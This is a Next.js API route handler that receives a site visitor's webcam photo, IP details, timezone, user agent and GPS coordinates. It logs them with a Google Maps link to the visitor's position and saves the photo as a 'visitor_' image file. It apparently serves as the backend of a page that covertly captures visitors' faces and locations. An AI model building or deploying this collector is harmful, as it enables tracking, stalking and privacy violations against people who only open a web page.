import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

export async function POST(req: NextRequest) {
  const body = await req.json();
  const { photo, ipInfo, timezone, userAgent, location } = body;

  console.log('🚨 API hit: /api/log-photo');
  console.log('🧠 IP Info:', ipInfo);
  console.log('🕐 Timezone:', timezone);
  console.log('🧠 User-Agent:', userAgent);

  if (location) {
    console.log('📍 Location:', location);
    console.log(
      `🗺️ Google Maps: https://www.google.com/maps?q=${location.latitude},${location.longitude}`
    );
  } else {
    console.log('📍 Location: Not available or denied');
  }

  // Save image to Downloads folder
  try {
    const base64Data = photo.replace(/^data:image\/jpeg;base64,/, '');
    // const filePath = path.join(process.env.HOME || '', 'Downloads', `visitor_${Date.now()}.jpg`); //TODO - uncomment for local. remove below for local
    const filePath = path.join('/tmp', `visitor_${Date.now()}.jpg`);
    fs.writeFileSync(filePath, base64Data, 'base64');
    console.log(`✅ Image saved at: ${filePath}`);
  } catch (err) {
    console.error('❌ Error saving image:', err);
  }

  return NextResponse.json({ status: 'logged' });
}
